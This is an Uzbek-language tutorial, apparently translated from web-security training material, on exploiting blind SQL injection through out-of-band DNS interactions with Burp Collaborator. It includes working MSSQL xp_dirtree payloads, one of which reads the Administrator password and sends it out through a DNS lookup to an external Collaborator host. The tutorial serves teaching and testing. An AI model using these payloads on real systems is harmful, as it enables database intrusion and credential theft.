## Blind SQL injection’ni **out-of-band (OAST)** texnikalari yordamida ekspluatatsiya qilish

Ilova oldingi misoldagidek SQL so‘rovini bajarishi mumkin, ammo uni **asinxron** tarzda amalga oshiradi. Ya’ni, ilova foydalanuvchining so‘rovini asosiy oqimda qayta ishlashda davom etadi, SQL so‘rovini esa boshqa oqim yordamida `tracking cookie` orqali bajaradi.

So‘rov hali ham SQL injection’ga zaif bo‘lsa-da, ilgari ko‘rib chiqilgan texnikalar bu yerda ishlamaydi. Chunki:

* Ilovaning javobi SQL so‘rovi qaytaradigan ma’lumotga bog‘liq emas
* Ma’lumotlar bazasi xatosi yuz berishiga bog‘liq emas
* Yoki so‘rovni bajarish uchun ketgan vaqtga ham bog‘liq emas.

Bunday holatda, blind SQL injection zaifligini **o‘z nazoratingizdagi tizimga tashqi tarmoq o‘zaro ta’sirlarini** (network interactions) majburlab yuborish orqali ekspluatatsiya qilish mumkin bo‘ladi. Bunday o‘zaro ta’sirlar injekt qilingan shartga qarab birma-bir ma’lumotni aniqlash uchun ishlatilishi mumkin. Bundan ham foydaliroq usuli — ma’lumotlarni to‘g‘ridan-to‘g‘ri shu tashqi tarmoq o‘zaro ta’siri orqali **exfiltratsiya qilish** (ya’ni, chiqarib yuborish).

Buning uchun turli xil tarmoq protokollaridan foydalanish mumkin, ammo odatda eng samaralisi bu **DNS (domain name service)** hisoblanadi. Chunki ko‘plab ishlab chiqarish (production) tarmoqlari normal tizimlarning ishlashi uchun zarur bo‘lgani sababli DNS so‘rovlarini tashqariga chiqishga (egress) ruxsat beradi.

Out-of-band texnikalardan foydalanish uchun eng oson va eng ishonchli vosita bu **Burp Collaborator** hisoblanadi. Bu server turli xil tarmoq xizmatlarining (DNS ham qo‘shilgan) maxsus implementatsiyalarini taqdim etadi. U sizga zaif ilovaga yuborilgan ma’lum **payload** natijasida tarmoq o‘zaro ta’sirlari yuzaga kelganini aniqlash imkonini beradi.

**Burp Suite Professional** ichida Burp Collaborator bilan darhol ishlashga sozlangan maxsus mijoz (client) mavjud. Batafsil ma’lumot uchun Burp Collaborator hujjatlariga murojaat qilishingiz mumkin.

---

**DNS so‘rovlari yuborilishini qo‘zg‘atish texnikalari** ishlatilayotgan ma’lumotlar bazasiga xosdir. Masalan, **Microsoft SQL Server** da quyidagi input orqali ma’lum domen bo‘yicha DNS lookup’ni majburlash mumkin:

```sql
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```

Bu kod ma’lumotlar bazasini quyidagi domen bo‘yicha DNS lookup amalga oshirishga majbur qiladi:

```
0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net
```


**Ko‘r (blind) SQL injeksiyasidan tashqarida aloqa (OAST) texnikalari orqali foydalanish – Davomi**

Tashqarida aloqa (out-of-band) o‘zaro ta’sirlarini ishga tushirish usuli aniqlangach, ushbu kanal orqali zaif ilovadan ma’lumotlarni chiqarib olish (exfiltratsiya qilish) mumkin. Masalan:

```sql
'; declare @p varchar(1024);
set @p=(SELECT password FROM users WHERE username='Administrator');
exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

Ushbu input **Administrator** foydalanuvchisining parolini o‘qiydi, uni noyob Collaborator subdomeniga qo‘shadi va DNS so‘rovini ishga tushiradi. Ushbu so‘rov orqali parolni ushlab olish mumkin:

```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```

Out-of-band (OAST) texnikalari ko‘r SQL injeksiyasini aniqlash va ekspluatatsiya qilishda kuchli usul hisoblanadi, chunki muvaffaqiyat ehtimoli yuqori va ma’lumotlarni bevosita tashqi kanal orqali chiqarib olish imkonini beradi. Shu sababli, ko‘pincha boshqa ko‘r injeksiya usullari ishlagan holatlarda ham OAST texnikalaridan foydalanish ma’qul bo‘ladi.

**Eslatma:**
Tashqarida aloqa (out-of-band) o‘zaro ta’sirlarini ishga tushirishning turli usullari mavjud va ular turli xil ma’lumotlar bazalariga qarab farqlanadi. Batafsil ma’lumot uchun *SQL injection cheat sheet*’ni ko‘ring.

